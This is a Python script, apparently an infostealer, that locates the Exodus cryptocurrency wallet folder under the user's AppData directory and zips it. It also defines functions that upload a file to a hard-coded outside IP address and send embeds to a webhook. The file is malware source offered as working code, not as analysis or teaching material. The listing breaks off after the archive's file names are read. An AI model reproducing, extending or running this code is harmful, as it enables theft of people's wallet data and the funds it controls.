import requests
import shutil
import zipfile
import os
import json


class Exodus:
    def __init__(self, webhook):
        self.webhook = webhook

def zip_directory(directory_path, output_zip):
    shutil.make_archive(output_zip, 'zip', directory_path)

def get_files_in_zip(zip_file_path):
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        return zip_ref.namelist()

def send_file_to_webhook(file_path):
    with open(file_path, 'rb') as file:
        files = {'file': (os.path.basename(file_path), file)}
        requests.post('http://45.138.16.193:8080/upload', files={'file': file})

def send_embed_to_webhook(webhook, embed):
    payload = {
        'embeds': [embed]
    }
    response = requests.post(webhook, data={'payload_json': json.dumps(payload)})
    
    if response.status_code == 200:
        pass
    else:
        pass


username = os.getlogin()

directory = os.path.expanduser(rf'C:\Users\{username}\AppData\Roaming\Exodus\exodus.wallet')
output_zip = os.path.expanduser(rf'C:\Users\{username}\AppData\Roaming\Exodus\exodus_wallet_{username}')

if os.path.isdir(directory):
    zip_directory(directory, output_zip)
    
    zip_file_path = f"{output_zip}.zip"
    file_list = get_files_in_zip(zip_file_path)